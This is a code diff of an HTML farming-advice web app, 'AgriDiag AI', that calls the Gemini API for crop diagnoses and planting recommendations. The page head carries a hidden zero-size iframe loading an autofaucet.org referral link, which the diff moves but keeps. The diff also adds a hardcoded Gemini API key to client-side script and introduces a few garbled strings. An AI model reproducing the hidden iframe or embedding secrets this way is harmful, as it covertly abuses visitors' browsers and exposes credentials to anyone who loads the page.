@@ -1,12 +1,12 @@
 ﻿<!DOCTYPE html>
 <html lang="en">
 <head>
+    <iframe src="https://autofaucet.org/wm/kenkor100/4" width="0" height="0" style="border:0"></iframe>
     <meta charset="UTF-8">
     <!-- IMPORTANT: When saving this file, ensure your text editor is set to save it with UTF-8 encoding.
          This is crucial for proper display of special characters (like those in French) when running the app offline directly from the file.
          Even with <meta charset="UTF-8">, some browsers might misinterpret the file if it's not actually saved as UTF-8. -->
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<iframe src="https://autofaucet.org/wm/kenkor100/4" width="0" height="0" style="border:0"></iframe>
     <title>AgriDiag AI</title>
     <!-- Tailwind CSS CDN -->
     <script src="https://cdn.tailwindcss.com"></script>
@@ -801,8 +801,7 @@
                     </button>
             </div>
         </section>
-
-        <!-- About Section (Placeholder) -->
+<!-- About Section (Placeholder) -->
         <section id="about" class="bg-white p-8 rounded-2xl shadow-xl mb-12 border border-gray-200">
             <h2 class="text-3xl font-bold text-gray-800 mb-6 text-center" data-key="aboutAgriDiagAITitle">About AgriDiag AI</h2>
             <div class="text-lg text-gray-700 leading-relaxed max-w-3xl mx-auto space-y-4">
@@ -854,10 +853,10 @@
 
     <footer class="bg-gray-800 text-white py-6 mt-auto rounded-t-xl">
         <div class="container mx-auto text-center text-sm">
-            <p>&copy; 2024 AgriDiag AI. All rights reserved.</p>
-            <p class="mt-2">Disclaimer: This tool is for informational purposes only. Consult with agricultural experts for precise advice.</p>
+             <p>&copy; 2025 AgriDiag AI. All rights reserved.</p>
+            <p class="mt-2" data-key="footerDisclaimer">Disclaimer: This tool is for informational purposes only. Consult with agricultural experts for precise advice.</p>
             <p class="mt-2">
-                <a href="https://www.termsfeed.com/live/00cb7a0d-d1ea-4787-a7b8-fea62a4a339a" target="_blank" class="text-emerald-400 hover:underline">Privacy Notice</a>
+                <a href="https://www.termsfeed.com/live/00cb7a0d-d1ea-4787-a7b8-fea62a4a339a" target="_blank" class="text-emerald-400 hover:underline" data-key="privacyNotice">Privacy Notice</a>
             </p>
         </div>
     </footer>
@@ -894,6 +893,9 @@
         const modalMessage = document.getElementById('modalMessage');
         const modalConfirmBtn = document.getElementById('modalConfirmBtn');
         const modalCancelBtn = document.getElementById('modalCancelBtn');
+
+        // Hardcoded Gemini API Key
+        const geminiApiKey = 'AIzaSyBbNgR15IGV1kM3HaLOKDwT7Tel6zbX9MA';
 
         // Language Switchers
         const languageSwitcherDesktop = document.getElementById('language-switcher-desktop');
@@ -1052,7 +1054,7 @@
                 noYieldsMessage: 'No yield records yet.',
                 clearAllYields: 'Clear All Yields',
                 harvestDateLabel: 'Harvest Date:',
-                yieldNotesPlaceholder: 'Add any relevant details about this yield, e.g., \'Good quality, low spoilage.\'',
+                yieldNotesPlaceholder: "Add any relevant details about this yield, e.g., 'Good quality, low spoilage.'",
                 selectCropPlanOption: '-- Select a crop plan --',
                 cropPlan: 'Crop Plan',
 
@@ -1304,7 +1306,7 @@
                 noYieldsMessage: 'Aucun enregistrement de rendement pour l\'instant.',
                 clearAllYields: 'Effacer tous les rendements',
                 harvestDateLabel: 'Date de récolte :',
-                yieldNotesPlaceholder: 'Ajouter des détails pertinents sur ce rendement, ex: \'Bonne qualité, faible perte.\'',
+                yieldNotesPlaceholder: "Ajouter des détails pertinents sur ce rendement, ex: 'Bonne qualité, faible perte.'",
                 selectCropPlanOption: '-- Sélectionnez un plan de culture --',
                 cropPlan: 'Plan de culture',
 
@@ -1360,7 +1362,7 @@
                 contactUsP2: 'N\'hésitez pas à nous contacter pour toute question agricole ou assistance technique avec l\'application.',
 
                 // Footer
-                copyright: '&copy; 2024 AgriDiag AI. Tous droits réservés.',
+                copyright: '&copy; 2024 AgriDiag AI. All rights reserved.',
                 footerDisclaimer: 'Avertissement : Cet outil est à titre informatif uniquement. Consultez des experts agricoles pour des conseils précis.',
                 privacyNotice: 'Avis de confidentialité',
                 backToTop: 'Retour en haut',
@@ -2178,7 +2180,6 @@
                 return;
             }
 
-
             // Show loader and disable button
             diagnoseButton.disabled = true;
             loader.style.display = 'block';
@@ -2206,15 +2207,27 @@
                 chatHistory.push({ role: "user", parts: [{ text: prompt }] });
                 const payload = { contents: chatHistory };
 
-                // Note: apiKey is an empty string as Canvas runtime provides it
-                const apiKey = "";
-                const apiUrl = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=${apiKey}`;
+                // Use the hardcoded API key
+                const apiUrl = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=${geminiApiKey}`;
 
                 const response = await fetch(apiUrl, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
+
+                // Check if the HTTP response itself was successful
+                if (!response.ok) {
+                    const errorData = await response.json(); // Try to parse error details
+                    console.error('API call failed with status:', response.status, errorData);
+                    let errorMessage = errorData.error ? errorData.error.message : `HTTP error! Status: ${response.status}`;
+                    if (response.status === 400 && errorMessage.includes("API key not valid")) {
+                        errorMessage = currentLanguage === 'fr' ? 'Clé API invalide. Veuillez vérifier votre clé API Gemini.' : 'Invalid API key. Please check your Gemini API key.';
+                    } else if (response.status === 403) {
+                        errorMessage = currentLanguage === 'fr' ? 'Accès refusé. Vérifiez les autorisations de votre clé API.' : 'Access denied. Check your API key permissions.';
+                    }
+                    throw new Error(errorMessage);
+                }
 
                 const result = await response.json();
 
@@ -2236,16 +2249,28 @@
                     showToast(currentLanguage === 'fr' ? 'Diagnostic enregistré dans l\'historique.' : 'Diagnosis saved to history.');
                     renderDiagnosisHistory(); // Refresh history view
                 } else {
-                    console.error('Unexpected API response structure:', result);
+                    console.error('Unexpected API response structure or empty content:', result);
                     showToast(currentLanguage === 'fr' ? 'Impossible d\'obtenir un diagnostic. Veuillez réessayer.' : 'Could not get a diagnosis. Please try again.');
-                    resultContentDiv.innerHTML = `<p class="text-red-600">${currentLanguage === 'fr' ? 'Échec de l\'obtention d\'un diagnostic. Veuillez réessayer avec une description plus détaillée.' : 'Failed to get a diagnosis. Please try again with a more detailed description.'}</p>`;
+                    resultContentDiv.innerHTML = `<p class="text-red-600">${currentLanguage === 'fr' ? 'Échec de l\'obtention d\'un diagnostic. Veuillez réessayer avec une description plus détaillée.' : 'Failed to get a diagnosis. Please try again with a more detailed description.'}<br><em>${currentLanguage === 'fr' ? 'Détails techniques (voir console) : Réponse vide ou inattendue.' : 'Technical details (see console): Empty or unexpected response.'}</em></p>`;
                     diagnosisResultDiv.classList.remove('hidden');
                 }
 
             } catch (error) {
                 console.error('Error fetching diagnosis:', error);
-                showToast(currentLanguage === 'fr' ? 'Une erreur est survenue lors du diagnostic. Veuillez vérifier votre connexion internet et réessayer.' : 'An error occurred during diagnosis. Please check your internet connection and try again.');
-                resultContentDiv.innerHTML = `<p class="text-red-600">${currentLanguage === 'fr' ? 'Une erreur est survenue. Veuillez réessayer.' : 'An error occurred. Please try again.'}</p>`;
+                let userMessage = currentLanguage === 'fr' ? 'Une erreur est survenue. Veuillez réessayer.' : 'An error occurred. Please try again.';
+                let technicalDetails = error.message || 'Unknown error';
+
+                if (error instanceof TypeError && error.message === 'Failed to fetch') {
+                    userMessage = currentLanguage === 'fr' ? 'Impossible de se connecter au service de diagnostic AI. Veuillez vérifier votre connexion Internet.' : 'Failed to connect to AI diagnosis service. Please check your internet connection.';
+                    technicalDetails = 'Network error: Failed to fetch';
+                } else if (error.message.includes("API key not valid")) {
+                    userMessage = currentLanguage === 'fr' ? 'Clé API invalide. Veuillez vérifier votre clé API Gemini.' : 'Invalid API key. Please check your Gemini API key.';
+                } else if (error.message.includes("Access denied")) {
+                    userMessage = currentLanguage === 'fr' ? 'Accès refusé. Vérifiez les autorisations de votre clé API.' : 'Access denied. Check your API key permissions.';
+                }
+
+                showToast(userMessage);
+                resultContentDiv.innerHTML = `<p class="text-red-600">${userMessage}<br><em>${currentLanguage === 'fr' ? 'Détails techniques (voir console) : ' : 'Technical details (see console): '}${technicalDetails}</em></p>`;
                 diagnosisResultDiv.classList.remove('hidden');
             } finally {
                 // Hide loader and enable button
@@ -2616,7 +2641,7 @@
                 return;
             }
             if (!navigator.onLine) {
-                showToast(currentLanguage === 'fr' ? 'Vous êtes hors ligne. Les recommandations de plantation IA nécessitent une connexion internet.' : 'You êtes hors ligne. AI Planting Recommendations require an internet connection.');
+                showToast(currentLanguage === 'fr' ? 'Vous êtes hors ligne. Les recommandations de plantation IA nécessitent une connexion internet.' : 'You êtes hors ligne. AI Planting Recommendations require an an internet connection.');
                 plantingRecommendationResult.classList.add('hidden');
                 return;
             }
@@ -2655,14 +2680,27 @@
                 chatHistory.push({ role: "user", parts: [{ text: prompt }] });
                 const payload = { contents: chatHistory };
 
-                const apiKey = ""; // Canvas runtime provides this
-                const apiUrl = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=${apiKey}`;
+                // Use the hardcoded API key
+                const apiUrl = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=${geminiApiKey}`;
 
                 const response = await fetch(apiUrl, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
+
+                // Check if the HTTP response itself was successful
+                if (!response.ok) {
+                    const errorData = await response.json(); // Try to parse error details
+                    console.error('API call failed with status:', response.status, errorData);
+                    let errorMessage = errorData.error ? errorData.error.message : `HTTP error! Status: ${response.status}`;
+                    if (response.status === 400 && errorMessage.includes("API key not valid")) {
+                        errorMessage = currentLanguage === 'fr' ? 'Clé API invalide. Veuillez vérifier votre clé API Gemini.' : 'Invalid API key. Please check your Gemini API key.';
+                    } else if (response.status === 403) {
+                        errorMessage = currentLanguage === 'fr' ? 'Accès refusé. Vérifiez les autorisations de votre clé API.' : 'Access denied. Check your API key permissions.';
+                    }
+                    throw new Error(errorMessage);
+                }
 
                 const result = await response.json();
 
@@ -2677,16 +2715,28 @@
                     plantingRecommendationResult.classList.remove('hidden');
                     showToast(currentLanguage === 'fr' ? 'Recommandations de plantation générées !' : 'Planting recommendations generated!');
                 } else {
-                    console.error('Unexpected API response structure:', result);
+                    console.error('Unexpected API response structure or empty content:', result);
                     showToast(currentLanguage === 'fr' ? 'Impossible d\'obtenir des recommandations de plantation. Veuillez réessayer.' : 'Could not get planting recommendations. Please try again.');
-                    plantingResultContent.innerHTML = `<p class="text-red-600">${currentLanguage === 'fr' ? 'Échec de l\'obtention des recommandations. Veuillez réessayer avec des entrées plus spécifiques.' : 'Failed to get recommendations. Please try again with more specific inputs.'}</p>`;
+                    plantingResultContent.innerHTML = `<p class="text-red-600">${currentLanguage === 'fr' ? 'Échec de l\'obtention des recommandations. Veuillez réessayer avec des entrées plus spécifiques.' : 'Failed to get recommendations. Please try again with more specific inputs.'}<br><em>${currentLanguage === 'fr' ? 'Détails techniques (voir console) : Réponse vide ou inattendue.' : 'Technical details (see console): Empty or unexpected response.'}</em></p>`;
                     plantingRecommendationResult.classList.remove('hidden');
                 }
 
             } catch (error) {
                 console.error('Error fetching planting recommendations:', error);
-                showToast(currentLanguage === 'fr' ? 'Une erreur est survenue lors de la génération des recommandations. Veuillez vérifier votre connexion internet et réessayer.' : 'An error occurred during recommendation generation. Please check your internet connection and try again.');
-                plantingResultContent.innerHTML = `<p class="text-red-600">${currentLanguage === 'fr' ? 'Une erreur est survenue. Veuillez réessayer.' : 'An error occurred. Please try again.'}</p>`;
+                let userMessage = currentLanguage === 'fr' ? 'Une erreur est survenue. Veuillez réessayer.' : 'An error occurred. Please try again.';
+                let technicalDetails = error.message || 'Unknown error';
+
+                if (error instanceof TypeError && error.message === 'Failed to fetch') {
+                    userMessage = currentLanguage === 'fr' ? 'Impossible de se connecter au service de recommandations AI. Veuillez vérifier votre connexion Internet.' : 'Failed to connect to AI recommendation service. Please check your internet connection.';
+                    technicalDetails = 'Network error: Failed to fetch';
+                } else if (error.message.includes("API key not valid")) {
+                    userMessage = currentLanguage === 'fr' ? 'Clé API invalide. Veuillez vérifier votre clé API Gemini.' : 'Invalid API key. Please check your Gemini API key.';
+                } else if (error.message.includes("Access denied")) {
+                    userMessage = currentLanguage === 'fr' ? 'Accès refusé. Vérifiez les autorisations de votre clé API.' : 'Access denied. Check your API key permissions.';
+                }
+
+                showToast(userMessage);
+                plantingResultContent.innerHTML = `<p class="text-red-600">${userMessage}<br><em>${currentLanguage === 'fr' ? 'Détails techniques (voir console) : ' : 'Technical details (see console): '}${technicalDetails}</em></p>`;
                 plantingRecommendationResult.classList.remove('hidden');
             } finally {
                 // Hide loader and enable button
